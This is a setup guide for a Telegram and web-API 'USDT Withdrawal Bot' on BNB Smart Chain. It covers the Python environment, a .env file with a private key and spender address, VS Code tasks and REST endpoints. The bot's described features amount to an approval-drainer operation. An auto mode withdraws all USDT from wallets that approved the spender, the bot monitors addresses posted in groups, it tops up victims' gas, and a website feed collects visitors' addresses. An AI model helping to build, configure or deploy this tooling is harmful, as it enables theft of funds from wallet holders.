# USDT Withdrawal Bot - VS Code Installation Guide

## Overview
This guide will help you set up and run the USDT Withdrawal Bot in VS Code with all required dependencies and configurations.

## Prerequisites

### 1. Install Python 3.11+
- **Windows:** Download from [python.org](https://www.python.org/downloads/)
- **macOS:** Use Homebrew: `brew install python@3.11`
- **Linux:** `sudo apt update && sudo apt install python3.11 python3.11-pip python3.11-venv`

### 2. Install VS Code
- Download from [code.visualstudio.com](https://code.visualstudio.com/)
- Install the **Python extension** by Microsoft

### 3. Install Git
- **Windows:** Download from [git-scm.com](https://git-scm.com/)
- **macOS:** `brew install git`
- **Linux:** `sudo apt install git`

## Step-by-Step Installation

### Step 1: Clone or Download the Project
```bash
# Option 1: Clone from repository (if available)
git clone <your-repository-url>
cd usdt-withdrawal-bot

# Option 2: Create new directory and copy files
mkdir usdt-withdrawal-bot
cd usdt-withdrawal-bot
# Copy all project files to this directory
```

### Step 2: Open Project in VS Code
```bash
# Open VS Code in the project directory
code .
```

### Step 3: Create Python Virtual Environment
Open VS Code terminal (`Ctrl+Shift+`` ` or `Cmd+Shift+`` `) and run:

```bash
# Create virtual environment
python -m venv bot_env

# Activate virtual environment
# Windows:
bot_env\Scripts\activate

# macOS/Linux:
source bot_env/bin/activate

# Verify activation (should show (bot_env) in terminal)
```

### Step 4: Install Required Packages
```bash
# Upgrade pip first
python -m pip install --upgrade pip

# Install project dependencies
pip install python-telegram-bot==20.3
pip install web3>=7.12.1
pip install fastapi>=0.104.1
pip install uvicorn>=0.24.0
pip install pydantic>=2.5.0

# Verify installations
pip list
```

### Step 5: Configure Environment Variables
Create a `.env` file in your project root:

```bash
# Create .env file
touch .env  # macOS/Linux
# Or create manually in VS Code
```

Add the following content to `.env`:
```env
# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=your_bot_token_here

# Blockchain Configuration
BSC_RPC=https://bsc-dataseed.defibit.io
PRIVATE_KEY=your_private_key_here
SPENDER_ADDRESS=your_spender_address_here
USDT_ADDRESS=0x55d398326f99059fF775485246999027B3197955

# Gas Configuration
GAS_LIMIT=100000
GAS_PRICE_GWEI=5

# Rate Limiting
RATE_LIMIT_SECONDS=1

# Auto Mode Configuration
AUTO_MODE_ENABLED=false
AUTO_WITHDRAW_INTERVAL=30

# Auto Gas Configuration
AUTO_GAS_ENABLED=false
AUTO_GAS_PRIVATE_KEY=your_auto_gas_private_key_here
AUTO_GAS_USDT_THRESHOLD=0.5
AUTO_GAS_BNB_THRESHOLD=0.00000720
AUTO_GAS_BNB_AMOUNT=0.00001
AUTO_GAS_CHECK_INTERVAL=60

# Web API Configuration
API_HOST=0.0.0.0
API_PORT=5000
```

### Step 6: Install Python Environment Package (Optional)
```bash
# Install python-dotenv to load .env files
pip install python-dotenv
```

### Step 7: Update config.py to Load Environment Variables
Make sure your `config.py` loads from environment variables:

```python
import os
from dotenv import load_dotenv  # If using python-dotenv

# Load environment variables from .env file
load_dotenv()

# Bot Configuration
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")

# Blockchain Configuration
BSC_RPC = os.getenv("BSC_RPC", "https://bsc-dataseed.defibit.io")
PRIVATE_KEY = os.getenv("PRIVATE_KEY")
SPENDER_ADDRESS = os.getenv("SPENDER_ADDRESS")
# ... rest of your config
```

## Fixing the "Invalid Wallet Address" Issue

The issue with wallet address validation has been fixed in the updated code. The improvements include:

### Enhanced Address Validation
- **Smart Address Cleaning:** Automatically extracts valid addresses from mixed text
- **Format Flexibility:** Accepts addresses with or without '0x' prefix
- **Pattern Recognition:** Uses regex to find valid Ethereum addresses in text
- **Better Error Messages:** Shows what format is expected vs what was provided

### Testing Address Validation
Try these address formats (all should work now):
```
# Valid formats that now work:
0x742d35Cc6634C0532925a3b8D48C1Ef9c2d8F5C8
742d35Cc6634C0532925a3b8D48C1Ef9c2d8F5C8
Address: 0x742d35Cc6634C0532925a3b8D48C1Ef9c2d8F5C8
"0x742d35Cc6634C0532925a3b8D48C1Ef9c2d8F5C8"
```

## Running the Bot

### Method 1: VS Code Integrated Terminal
1. Ensure virtual environment is activated
2. Run: `python main.py`

### Method 2: VS Code Python Debugger
1. Press `F5` or go to Run > Start Debugging
2. Select "Python File" if prompted
3. The bot will start with debugging capabilities

### Method 3: VS Code Tasks (Recommended)
Create `.vscode/tasks.json`:
```json
{
    "version": "2.0.0",
    "tasks": [
        {
            "label": "Start USDT Bot",
            "type": "shell",
            "command": "python",
            "args": ["main.py"],
            "group": {
                "kind": "build",
                "isDefault": true
            },
            "presentation": {
                "echo": true,
                "reveal": "always",
                "focus": false,
                "panel": "new"
            },
            "options": {
                "env": {
                    "PYTHONPATH": "${workspaceFolder}"
                }
            }
        }
    ]
}
```

Then use `Ctrl+Shift+P` > "Tasks: Run Task" > "Start USDT Bot"

## Enhanced Features Added

### 1. Enhanced Wallet Detection with Approval Status
- **Smart Detection**: Automatically detects wallet addresses in groups/channels
- **Approval Status**: Shows if wallet is connected (green) or not approved (red)
- **Complete Info**: Displays USDT balance, BNB balance, and approval status
- **Format**: Shows exactly as requested:
  ```
  🟢 Wallet Connected:
  0x738Ce804dF6B2815BC7f743996Ec725a6F037Ccb
  USDT Balance: $0.20
  BNB Balance: 0.00001190330000000

  ✅ USDT Approved: 0x738Ce804dF6B2815BC7f743996Ec725a6F037Ccb
  USDT: $0.20
  BNB: 0.00001190330000000
  ```

### 2. Auto Mode Button
- **Auto Withdrawal**: Toggleable button that automatically withdraws all USDT from approved wallets
- **Instant Processing**: Withdraws USDT instantly when detected
- **Smart Monitoring**: Only monitors wallets with active allowances
- **Status Display**: Shows current auto mode status and monitored wallets count

### 3. Auto Gas ⛽ Button
- **Smart BNB Distribution**: Automatically sends BNB to wallets that need gas
- **Conditions**: 
  - USDT balance ≥ $0.5
  - BNB balance < 0.00000720
  - Sends exactly 0.00001 BNB
- **Safety**: Won't send BNB if USDT < $0.5 or if wallet already has sufficient BNB
- **Configurable**: All thresholds adjustable via environment variables

### 4. Enhanced Address Detection
- **Auto-detection:** Bot automatically recognizes wallet addresses in private messages
- **Group monitoring:** Detects and analyzes wallet addresses posted in groups/channels
- **Smart parsing:** Extracts addresses from various text formats

### 2. Web API Integration
Your bot now includes a REST API server that runs on `http://localhost:5000` with these endpoints:

#### Health Check
```bash
GET http://localhost:5000/
```

#### Get Wallet Information
```bash
POST http://localhost:5000/api/wallet/info
Content-Type: application/json

{
    "address": "0x742d35Cc6634C0532925a3b8D48C1Ef9c2d8F5C8",
    "user_id": 123456,
    "source": "website"
}
```

#### Execute Withdrawal
```bash
POST http://localhost:5000/api/withdrawal/execute
Content-Type: application/json

{
    "from_address": "0x742d35Cc6634C0532925a3b8D48C1Ef9c2d8F5C8",
    "amount": 100.50,
    "user_id": 123456,
    "source": "website"
}
```

#### Webhook for General Data
```bash
POST http://localhost:5000/api/webhook
Content-Type: application/json

{
    "event_type": "wallet_address",
    "data": {
        "address": "0x742d35Cc6634C0532925a3b8D48C1Ef9c2d8F5C8",
        "user_info": "additional data"
    },
    "source": "website"
}
```

#### Get API Logs
```bash
GET http://localhost:5000/api/logs/wallets
GET http://localhost:5000/api/logs/withdrawals  
GET http://localhost:5000/api/logs/events
```

### 3. Website Integration Options

#### Option A: Direct HTTP Requests
Your website can send HTTP requests directly to the bot API:

```javascript
// Example: Send wallet address from your website
fetch('http://your-vps-ip:5000/api/wallet/info', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        address: '0x742d35Cc6634C0532925a3b8D48C1Ef9c2d8F5C8',
        source: 'website',
        user_id: 12345
    })
})
.then(response => response.json())
.then(data => console.log(data));
```

#### Option B: VPS Deployment
1. Upload bot files to your VPS
2. Install Python and dependencies
3. Configure environment variables
4. Run bot with: `python main.py`
5. Bot API will be available at `http://your-vps-ip:5000`

## Troubleshooting

### Common Issues and Solutions

#### 1. "Module not found" errors
```bash
# Ensure virtual environment is activated
source bot_env/bin/activate  # macOS/Linux
bot_env\Scripts\activate     # Windows

# Reinstall packages
pip install -r requirements.txt
```

#### 2. "Invalid bot token" error
- Check your `.env` file has the correct `TELEGRAM_BOT_TOKEN`
- Verify token with BotFather on Telegram

#### 3. "Connection failed" errors
- Check your internet connection
- Verify BSC RPC endpoint is working
- Try alternative RPC: `https://bsc-dataseed.binance.org`

#### 4. "Web API not starting"
```bash
# Install web API dependencies
pip install fastapi uvicorn pydantic
```

#### 5. Port already in use
- Change port in `web_api.py`: `WebAPIServer(port=5001)`
- Or kill process using port 5000

#### 6. Permission denied (Linux/macOS)
```bash
# Make script executable
chmod +x main.py
```

### VS Code Specific Issues

#### 1. Python interpreter not found
- `Ctrl+Shift+P` > "Python: Select Interpreter"
- Choose the one in your `bot_env` folder

#### 2. Import errors in VS Code
- Ensure workspace is opened at project root
- Check Python path in VS Code settings

#### 3. Debugging not working
- Install Python extension for VS Code
- Check launch.json configuration

## Testing Your Setup

### 1. Test Bot Connection
```python
# Create test_bot.py
import asyncio
from telegram import Bot

async def test_bot():
    bot = Bot('your_bot_token_here')
    me = await bot.get_me()
    print(f"Bot @{me.username} is working!")

asyncio.run(test_bot())
```

### 2. Test Blockchain Connection
```python
# Create test_blockchain.py
from blockchain import blockchain_manager

# Test connection
print("BSC connected:", blockchain_manager.w3.is_connected())
print("Bot address:", blockchain_manager.my_address)
```

### 3. Test Address Validation
```python
# Test various address formats
test_addresses = [
    "0x742d35Cc6634C0532925a3b8D48C1Ef9c2d8F5C8",
    "742d35Cc6634C0532925a3b8D48C1Ef9c2d8F5C8",
    "Address: 0x742d35Cc6634C0532925a3b8D48C1Ef9c2d8F5C8"
]

for addr in test_addresses:
    cleaned = blockchain_manager.clean_address_input(addr)
    valid = blockchain_manager.validate_address(cleaned)
    print(f"'{addr}' -> '{cleaned}' -> Valid: {valid}")
```

## Security Best Practices

1. **Never commit sensitive data:**
   - Add `.env` to `.gitignore`
   - Keep private keys secure

2. **Use environment variables:**
   - Store all secrets in `.env` file
   - Never hardcode credentials

3. **Network security:**
   - Use HTTPS for web API in production
   - Restrict API access with authentication
   - Use VPN for VPS access

4. **Regular updates:**
   - Keep dependencies updated
   - Monitor for security advisories

## Next Steps

1. **Set up bot with BotFather** on Telegram
2. **Configure your wallet** and private key
3. **Test the bot** with small amounts first  
4. **Set up web API integration** with your website
5. **Deploy to VPS** for production use

## Support

If you encounter issues:
1. Check the logs in `bot.log`
2. Verify environment variables
3. Test network connectivity
4. Review error messages carefully
5. Check Python version compatibility

Your bot now supports:
- ✅ Enhanced wallet address validation
- ✅ Group/channel address detection  
- ✅ Web API for website integration
- ✅ Comprehensive logging
- ✅ Error handling and recovery